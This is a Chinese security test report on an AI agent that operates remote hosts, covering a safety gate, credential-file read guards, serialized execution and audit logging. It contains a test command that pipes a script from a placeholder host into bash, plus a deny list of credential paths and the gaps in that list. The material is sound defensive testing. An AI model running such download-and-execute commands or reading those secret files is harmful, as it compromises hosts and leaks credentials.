# 安全链路专项运行核验

本记录区分本地生产链路运行、传输替身和真实 SSH。没有实际付费模型请求，没有连接未确认指纹的服务器，不将局部通过计作整体安全验收。

## 1. curl 管道执行：本地链路通过，非无条件黑名单

命令：`pnpm exec vitest run Tests/desktop/worker/security-curl-runtime.test.ts --maxWorkers=1`

- 本地 SSE 模型被强制返回 `run_remote` 调用（`curl https://example.invalid/setup.sh | bash`），不是靠模型拒绝。
- 实际运行 Pi SDK → TaskRunner → SafetyGate；即使主机配置为 permissive，识别到下载后执行仍进入高影响审核。
- 人工拒绝：执行器调用 0 次；实际 AppState.commitOperation → 文件 SQLite 的 operations 中保存 denied/human-denied。关闭后重新打开数据库仍能读到。
- 人工批准对照：执行器替身调用 1 次，持久记录为 succeeded/human-approved；没有运行真实 curl、bash 或网络脚本。
- 2项通过。结论是“后端强制审核和拒批有效”，不是“curl管道在所有模式永久禁止”；AI审核模式可按现有策略交独立审核，未因此宣称无条件硬拒绝。

## 2. read 拒绝与审计（原始缺陷基线，14b39a2）

命令：`pnpm exec vitest run Tests/desktop/worker/security-read-runtime.test.ts --maxWorkers=1`

- 实际运行 WorkerServer → Pi SDK → tool_search → read_remote_file → 生产保护路径回调；不是直接单测正则。
- 请求 `/srv/app/.env`：工具返回 Credential file，SFTP读取调用0次，保护实际生效。
- 对照读取 `/srv/app/config.yaml`：传输替身返回含合成密码的内容，模型后续请求只得到 REDACTED，不含原始值。
- 两条路径都没有发出 commitOperation；独立连接同一文件 SQLite 查询 operations 均为空。**审计对齐验收失败：授权、凭据拦截与脱敏没有进入变更链的持久操作审计。**
- 测试的2项通过仅表示上述缺陷已稳定复现，不表示审计已修复。Pi会话中的工具消息/界面活动不等于统一的授权审计，不能称完全没有任何痕迹，也不能用它们代替审计。

## 3. 两会话串行与 Worker 重启恢复

命令：`pnpm exec vitest run Tests/desktop/worker/security-serialization-runtime.test.ts --maxWorkers=1`

- 运行两个独立 Pi 会话，共享生产 WorkerServer；观察两个 gate 都进入真实 HostSerialExecutor.execute，并断言接收者是同一个实例，不替换其锁逻辑。
- 第一条 touch 在传输替身内保持未退出；第二条已进入真实队列且记录 running，但尚未到达传输层。第一条以真实 TerminalManager 退出观察完成后，第二条才派发。
- 再生成一条无退出码的 unknown 记录，调用生产 Main.runtimeStopped，重开同一 SQLite 构造 AppState，然后创建全新 WorkerServer。
- 按生产 main/index.ts 的顺序先 restore-operations（含风险域绑定），再接纳新会话：变更被 unresolved-prior-operation 拦截，传输替身调用数不增加；df只读查询仍可执行。
- 1项复合运行用例通过。锁位于 WorkerServer 唯一的 HostSerialExecutor 内存实例；重建后依靠 Main 的持久记录恢复，不是内存锁跨进程存活。未执行真正的 utilityProcess 杀死/重启或真实SSH进程测试。

## 4. 保护规则配置

已完成代码审查（只报告，不修改业务规则）：

- 硬编码默认拦截位于 apps/desktop/src/worker/remote-read-guard.ts；shadow/gshadow、.env及其后缀、.ssh/id_*、authorized_keys 等被覆盖。
- 未覆盖任意目录的 *.pem、*.key，以及 .ssh 目录之外的 id_rsa；自定义 secret.yaml 不因文件名自动被视为秘密。
- 用户规则不是死列表：主机安全设置中的“禁止 AI 读取的路径”可填写绝对文件或目录前缀，例如 /home/app/config/secret.yaml 或 /home/app/config。支持文件/子树，不支持glob。
- 配置链为 SafetyDialog → registerHostSafetyIpc → WorkerServer.update-host-safety → TaskRunner.updateHostSafety，并保存在主机记录的 protectedReadPaths，更新 policyRevision。
- 结论：可配置保护存在；默认覆盖不完整，列表外只读不经独立语义审核，脱敏只是尽力识别而非完整防泄漏。

## 本次结论

1. 只读审计对齐：原始盲区已复现；后续修复已接入，故障专项验收另见下节。
2. 只读保护强度：并非不可配置，但默认规则有空缺，未修复。
3. 运行核验：curl拒批及持久记录、跨会话串行/持久恢复路径通过本地生产链路测试；真实utility process崩溃与SSH进程仍未验证。

以上为最初“只检查报告”阶段结论，原始检查未修改业务代码。用户随后授权修复，新增进展如下，不将原始特征测试通过当作安全验收通过。

## 后续修复进展

### 只读持久审计

- 新增明确的 read-file 观察记录，与变更共用 OperationCommitClient → AppState.commitOperation → 同一 SQLite operations 存储，不新建旁路日志。
- 元数据阶段记录 requested/authorized/denied/completed/failed，含固定原因码、路径、策略修订及脱敏/截断/字节数；不保存文件正文、正文哈希或原始服务端错误。
- 必须确认授权审计落盘后才调用SFTP，确认结果审计落盘后才交付模型；持久化失败或未确认时失败关闭。
- Main校验只读记录格式和已有事件前缀，拒绝夹带正文、进程能力或篡改旧事件；越权主机尝试只能以拒绝记录写入，不能成为执行授权。
- 原只读缺陷用例已改为目标回归：真实WorkerServer/Pi/文件SQLite中的.env拒绝及普通配置脱敏记录均存在，2项通过；类型检查与生产构建通过。存储故障、超时/迟到确认与动态策略专项仍待本轮后续验收。

## 未验收边界

真实 SSH/操作系统进程、utility process 真正崩溃重启、付费模型行为、跨平台与安装包仍未验收。四项全部完成前不得称安全验收完成。
